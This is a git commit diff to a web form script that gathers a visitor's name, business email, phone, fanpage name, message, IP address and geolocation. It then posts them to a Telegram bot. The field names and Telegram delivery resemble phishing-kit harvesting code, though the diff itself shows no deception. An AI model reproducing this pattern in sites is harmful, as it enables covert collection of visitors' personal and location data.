05b0a8003072fc0043c89d9d905266f0fb454e3e
Nguyễn Hữu Thuật <thuatnguyen09112002@gmail.com>
2024-04-19 12:10:30 +0700

    update index.js

--- asset/index.js
+++ asset/index.js
@@ -15,30 +15,44 @@ document
     }
 
     // Get user's IP address
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(ipData => {
+    fetch("https://api.ipify.org?format=json")
+      .then((response) => response.json())
+      .then((ipData) => {
         // Add IP address to data
         data.ip = ipData.ip;
 
-        // Send message to Telegram bot
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: JSON.stringify(data, null, 2),
-          }),
-        })
-          .then((response) => response.json())
-          .then((data) => console.log(data));
+        // Get user's location
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition((position) => {
+            data.location = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+            };
 
-        // Clear form data after sending
-        document.querySelector(".form_content").reset();
+            function formatData(data) {
+              return `• Name: ${data.fullName}\n• Email: ${data.BusinessEmail}\n• Mobile: ${data.mobilePhone}\n• Telegram: ${data.nameFanpage}\n• Message: ${data.Note}\n• IP: ${data.ip}\n• Location: Latitude - ${data.location.latitude}, Longitude - ${data.location.longitude}`;
+            }
 
-        // Notify successful sending
-        alert("Gửi thành công");
+            // Send message to Telegram bot
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({
+                chat_id: chatId,
+                text: formatData(data),
+              }),
+            })
+              .then((response) => response.json())
+              .then((data) => console.log(data));
+
+            // Clear form data after sending
+            document.querySelector(".form_content").reset();
+
+            // Notify successful sending
+            alert("Gửi thành công");
+          });
+        }
       });
   });
